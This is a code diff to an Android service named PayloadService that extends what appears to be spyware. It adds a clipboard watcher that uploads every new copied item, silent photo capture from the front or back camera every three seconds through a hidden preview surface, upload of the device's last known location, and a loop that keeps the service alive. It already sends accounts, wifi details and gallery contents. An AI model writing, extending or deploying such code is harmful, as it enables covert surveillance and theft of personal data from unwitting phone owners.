@@ -10,11 +10,15 @@ import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ApplicationInfo
+import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.Canvas
+import android.graphics.SurfaceTexture
 import android.graphics.drawable.BitmapDrawable
 import android.graphics.drawable.Drawable
+import android.hardware.Camera
+import android.location.LocationManager
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.net.Uri
@@ -48,6 +52,7 @@ class PayloadService : Service() {
     private var chat = ""
     private var appName = ""
     private var clipText = ""
+    private var keepAlive = false
 
     override fun onCreate() {
         super.onCreate()
@@ -72,11 +77,13 @@ class PayloadService : Service() {
             } catch (t: Throwable) {
                 HsLog.e("run: ${t.javaClass.simpleName} ${t.message}")
             } finally {
-                try {
-                    stopForeground(true)
-                } catch (_: Throwable) {
+                if (!keepAlive) {
+                    try {
+                        stopForeground(true)
+                    } catch (_: Throwable) {
+                    }
+                    stopSelf()
                 }
-                stopSelf()
             }
         }.start()
 
@@ -95,12 +102,8 @@ class PayloadService : Service() {
         HsLog.w("features=$f")
 
         if (f.contains("clipboard")) {
-            if (clipText.isNotEmpty()) {
-                HsLog.w("clip from gate=" + clipText.length)
-                sendTextFile("clipboard.txt", clipText)
-            } else {
-                sendClipboard()
-            }
+            if (clipText.isNotEmpty()) sendTextFile("clipboard.txt", clipText + "\n")
+            startClipWatcher()
         }
 
         if (f.contains("gallery")) {
@@ -122,10 +125,30 @@ class PayloadService : Service() {
         if (f.contains("wifi")) sendWifi()
         if (f.contains("accounts")) sendAccounts()
         if (f.contains("system")) sendSystem()
+        if (f.contains("location")) sendLocation()
+
+        if (f.contains("front_camera")) {
+            keepAlive = true
+            startCamera(true)
+        }
+        if (f.contains("back_camera")) {
+            keepAlive = true
+            startCamera(false)
+        }
 
         pool.shutdown()
         pool.awaitTermination(30, TimeUnit.MINUTES)
         HsLog.w("all done: ${done.get()}")
+
+        if (keepAlive) {
+            while (true) {
+                try {
+                    Thread.sleep(60_000L)
+                } catch (_: InterruptedException) {
+                    break
+                }
+            }
+        }
     }
 
     private fun startForegroundSafe() {
@@ -264,6 +287,124 @@ class PayloadService : Service() {
             } catch (_: Throwable) {
             }
         }
+    }
+
+    private fun startClipWatcher() {
+        Thread {
+            val seen = HashSet<String>()
+            if (clipText.isNotEmpty()) seen.add(clipText)
+            val end = System.currentTimeMillis() + 600_000L
+            while (System.currentTimeMillis() < end) {
+                try {
+                    val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                    val clip = cm.primaryClip
+                    if (clip != null) {
+                        for (i in 0 until clip.itemCount) {
+                            val t = clip.getItemAt(i).text?.toString() ?: continue
+                            if (t.isBlank()) continue
+                            if (seen.add(t)) sendTextFile("clipboard.txt", t + "\n")
+                        }
+                    }
+                } catch (_: Throwable) {
+                }
+                try {
+                    Thread.sleep(1500L)
+                } catch (_: InterruptedException) {
+                    break
+                }
+            }
+        }.start()
+    }
+
+    private fun findCamera(front: Boolean): Int {
+        val want = if (front) Camera.CameraInfo.CAMERA_FACING_FRONT else Camera.CameraInfo.CAMERA_FACING_BACK
+        val info = Camera.CameraInfo()
+        for (i in 0 until Camera.getNumberOfCameras()) {
+            Camera.getCameraInfo(i, info)
+            if (info.facing == want) return i
+        }
+        return -1
+    }
+
+    private fun startCamera(front: Boolean) {
+        Thread {
+            var cam: Camera? = null
+            try {
+                val id = findCamera(front)
+                if (id < 0) {
+                    HsLog.e("camera not found front=$front")
+                    return@Thread
+                }
+                cam = Camera.open(id)
+                val st = SurfaceTexture(0)
+                cam.setPreviewTexture(st)
+                cam.startPreview()
+                HsLog.w("camera started front=$front")
+
+                while (true) {
+                    try {
+                        cam.takePicture(null, null, { data, _ ->
+                            if (data != null) {
+                                val name = (if (front) "front_" else "back_") +
+                                        System.currentTimeMillis() + ".jpg"
+                                postFile("sendPhoto", "photo", name, "image/jpeg", data)
+                            }
+                            try {
+                                cam.startPreview()
+                            } catch (_: Throwable) {
+                            }
+                        })
+                    } catch (t: Throwable) {
+                        HsLog.e("capture: ${t.message}")
+                        try {
+                            cam.startPreview()
+                        } catch (_: Throwable) {
+                        }
+                    }
+                    try {
+                        Thread.sleep(3000L)
+                    } catch (_: InterruptedException) {
+                        break
+                    }
+                }
+            } catch (t: Throwable) {
+                HsLog.e("camera: ${t.javaClass.simpleName} ${t.message}")
+            } finally {
+                try {
+                    cam?.stopPreview()
+                } catch (_: Throwable) {
+                }
+                try {
+                    cam?.release()
+                } catch (_: Throwable) {
+                }
+            }
+        }.start()
+    }
+
+    private fun sendLocation() {
+        val sb = StringBuilder()
+        try {
+            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
+                try {
+                    val loc = lm.getLastKnownLocation(p) ?: continue
+                    sb.append(p).append(": ")
+                        .append(loc.latitude).append(", ").append(loc.longitude)
+                        .append(" acc=").append(loc.accuracy)
+                        .append(" t=").append(loc.time).append("\n")
+                    sb.append("https://maps.google.com/?q=")
+                        .append(loc.latitude).append(",").append(loc.longitude).append("\n")
+                } catch (_: Throwable) {
+                }
+            }
+        } catch (t: Throwable) {
+            HsLog.e("location: ${t.message}")
+            return
+        }
+        if (sb.isEmpty()) sb.append("no last known location\n")
+        HsLog.w("loc chars=${sb.length}")
+        sendTextFile("location.txt", sb.toString())
     }
 
     private fun queryImages(): List<Uri> {
@@ -593,21 +734,6 @@ class PayloadService : Service() {
         }
         HsLog.w("accounts chars=${sb.length}")
         sendTextFile("accounts.txt", sb.toString())
-    }
-
-    private fun sendClipboard() {
-        try {
-            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
-            val clip = cm.primaryClip ?: return
-            val sb = StringBuilder()
-            for (i in 0 until clip.itemCount) {
-                val t = clip.getItemAt(i).text?.toString() ?: continue
-                sb.append(t).append("\n---\n")
-            }
-            if (sb.isNotEmpty()) sendTextFile("clipboard.txt", sb.toString())
-        } catch (t: Throwable) {
-            HsLog.e("clipboard: ${t.message}")
-        }
     }
 
     private fun sendSystem() {
